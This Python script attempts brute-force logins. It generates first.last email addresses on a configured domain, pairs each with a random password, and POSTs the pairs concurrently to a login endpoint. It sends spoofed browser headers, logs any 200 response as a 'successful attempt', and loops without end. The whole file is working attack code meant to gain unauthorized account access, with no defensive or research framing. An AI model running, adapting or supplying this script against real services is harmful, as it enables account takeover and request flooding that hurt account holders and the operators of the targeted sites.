import requests
import json
import random
import string
import itertools
import concurrent.futures
from dotenv import load_dotenv
import os

# Load environment variables from .env file
load_dotenv()

api_endpoint = os.getenv('API_ENDPOINT')
max_workers = os.getenv('MAX_WORKERS')
password_length = os.getenv('PASSWORD_LENGTH')
email_domain = os.getenv('EMAIL_DOMAIN')

# HTTP headers for the request
headers = {
    'Accept': os.getenv('ACCEPT'),
    'Content-Type': os.getenv('CONTENT_TYPE'),
    'Sec-Ch-Ua': os.getenv('SEC_CH_UA'),
    'Sec-Ch-Ua-Mobile': os.getenv('SEC_CH_UA_MOBILE'),
    'Sec-Ch-Ua-Platform': os.getenv('SEC_CH_UA_PLATFORM'),
    'User-Agent': os.getenv('USER_AGENT')
}

# Print the current working directory and environment variable values for debugging
print(f"Current working directory: {os.getcwd()}")
print(f"API_ENDPOINT: {api_endpoint}")
print(f"MAX_WORKERS: {max_workers}")
print(f"PASSWORD_LENGTH: {password_length}")
print(f"EMAIL_DOMAIN: {email_domain}")

if api_endpoint is None or max_workers is None or password_length is None or email_domain is None:
    print("Error: One or more environment variables are not set. Please check your .env file.")
    exit(1)

# Convert max_workers and password_length to integers
max_workers = int(max_workers)
password_length = int(password_length)

# Function to generate random email addresses
def generate_emails_for_length(length):
    characters = string.ascii_lowercase
    for first_name_tuple in itertools.product(characters, repeat=length):
        first_name = ''.join(first_name_tuple)
        for last_name_tuple in itertools.product(characters, repeat=length):
            last_name = ''.join(last_name_tuple)
            email = f'{first_name}.{last_name}@{email_domain}'
            yield email

# Function to generate random passwords
def generate_random_password(length=password_length):
    characters = string.ascii_letters + string.digits + string.punctuation
    password = ''.join(random.choices(characters, k=length))
    return password

# Function to save successful attempts
def save_successful_attempt(email, password):
    with open('successful_attempts.txt', 'a') as f:
        f.write(f'{email}:{password}\n')

# Function to send POST request
def send_post_request(email):
    password = generate_random_password()

    # JSON data to send
    data = {
        'email': email,
        'password': password
    }

    json_data = json.dumps(data)

    try:
        response = requests.post(api_endpoint, headers=headers, data=json_data)

        if response.status_code == 200:
            print(f'Successful attempt: {email}:{password}')
            save_successful_attempt(email, password)
        else:
            print(f'Testing {email}:{password} - Status Code: {response.status_code}')
    except requests.exceptions.RequestException as e:
        print(f'Error occurred: {e}')

# Test with increasing lengths of first and last names
length = 3

while True:
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = [executor.submit(send_post_request, email) for email in generate_emails_for_length(length)]
        concurrent.futures.wait(futures)

    length += 1
